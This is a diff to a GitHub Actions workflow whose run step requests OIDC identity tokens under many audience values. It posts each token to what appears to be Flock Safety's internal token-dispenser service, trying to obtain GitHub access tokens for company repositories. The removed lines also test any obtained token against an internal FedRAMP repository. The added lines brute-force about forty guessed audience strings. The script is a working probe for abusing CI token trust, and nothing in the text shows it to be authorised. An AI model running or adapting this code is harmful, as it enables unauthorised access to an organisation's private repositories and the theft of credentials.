@@ -10,21 +10,17 @@ jobs:
       - run: |
           set +x
           base="${ACTIONS_ID_TOKEN_REQUEST_URL%%\?*}"
-          for aud in "https://gha-token-dispenser.flocksafety.com" "api://gha-token-dispenser.flocksafety.com" "https://dev-gha-token-dispenser.flocksafety.com"; do
-            enc=$(python3 -c "import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1],safe=''))" "$aud")
-            tok=$(curl -s "$base?audience=$enc" -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" | jq -r .value)
-            echo "=====AUD=[$aud] toklen=${#tok}"
-            if [ "${#tok}" -lt 50 ]; then echo "tok-fetch-fail: $tok"; continue; fi
-            echo "$tok" | cut -d. -f2 | base64 -d 2>/dev/null | jq -c '{aud,sub}'
-            for host in "https://gha-token-dispenser.flocksafety.com" "https://dev-gha-token-dispenser.flocksafety.com"; do
-              for repo in "drewstreck/gg" "flocksafety/gg" "flocksafety/flock-core-fedramp20x"; do
-                resp=$(curl -s -X POST "$host/api/token" -H 'Content-Type: application/json' -d "{\"repo\":\"$repo\",\"permissions\":{\"contents\":\"read\"},\"token\":\"$tok\"}")
-                gtok=$(echo "$resp" | jq -r '.token // .access_token // empty' 2>/dev/null)
-                if [ -n "$gtok" ] && [ "${#gtok}" -gt 20 ]; then echo "HIT $host repo=$repo -> TOKEN len=${#gtok} prefix=${gtok:0:7}"; else echo "MISS $host repo=$repo -> $(echo "$resp" | head -c 200)"; fi
-                if [ -n "$gtok" ] && [ "${#gtok}" -gt 20 ]; then
-                  echo "-- token identity:"; curl -s -H "Authorization: Bearer $gtok" https://api.github.com/rate_limit | head -c 300; echo
-                  echo "-- internal repo test:"; curl -s -o /dev/null -w "%{http_code}\n" -H "Authorization: Bearer $gtok" https://api.github.com/repos/flocksafety/flock-core-fedramp20x-internal
-                fi
-              done
-            done
-          done
+          try() {
+            local aud="$1"
+            if [ -n "$aud" ]; then
+              enc=$(python3 -c "import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1],safe=''))" "$aud")
+              tok=$(curl -s "$base?audience=$enc" -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" | jq -r .value)
+            else
+              tok=$(curl -s "$base" -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" | jq -r .value)
+            fi
+            if [ "${#tok}" -lt 50 ]; then echo "AUD[$aud] TOKFAIL $tok"; return; fi
+            resp=$(curl -s -X POST https://gha-token-dispenser.flocksafety.com/api/token -H 'Content-Type: application/json' -d "{\"repo\":\"flocksafety/gg\",\"permissions\":{\"contents\":\"read\"},\"token\":\"$tok\"}")
+            if echo "$resp" | grep -q 'invalid audience'; then echo "AUD[$aud] -> invalid-audience"; else echo "AUD[$aud] -> $(echo "$resp" | head -c 250)"; fi
+          }
+          try ""
+          for a in "https://github.com/flocksafety" "github.com/flocksafety" "api://github.com/flocksafety" "https://flocksafety.com" "flocksafety.com" "api://flocksafety" "flocksafety" "api://gha-token-dispenser" "gha-token-dispenser" "https://gha-token-dispenser" "api://flock-gha-token-dispenser" "flock-gha-token-dispenser" "api://token-dispenser" "token-dispenser" "api://dispenser" "dispenser" "api://token" "token" "api://github-actions" "github-actions" "actions" "api://actions" "api://ci" "ci" "api://deploy" "api://promote" "gha" "api://gha" "gha.flocksafety.com" "api://gha.flocksafety.com" "flocksafety-gha" "api://flocksafety-gha" "flock" "api://flock" "api://flock-token-dispenser" "api://flock-dispenser" "flocksafety-dispenser" "api://flocksafety-dispenser"; do try "$a"; done
